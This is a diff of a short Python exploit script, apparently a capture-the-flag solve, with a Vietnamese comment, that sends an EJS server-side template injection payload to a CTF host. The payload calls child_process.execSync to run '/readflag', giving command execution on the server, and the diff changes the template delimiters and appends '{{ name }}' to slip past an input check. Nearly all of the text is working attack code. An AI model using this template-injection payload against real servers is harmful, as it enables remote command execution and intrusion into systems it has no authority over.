@@ -1,9 +1,9 @@
 import requests
 
-url = "https://valentine.kcsc.tf"
+url = "http://ejs-3.1.8-7548cb2a.dailycookie.cloud"
 
 # cho thêm {{ name }} vì trong code có check xem template nhập vào có chứa chuỗi đó không
-tmpl = """<.= global.process.mainModule.require('child_process').execSync('/readflag') .>{{ name }} """
+tmpl = """[.= global.process.mainModule.require('child_process').execSync('/readflag') .]{{ name }} """
 
 
 data = {
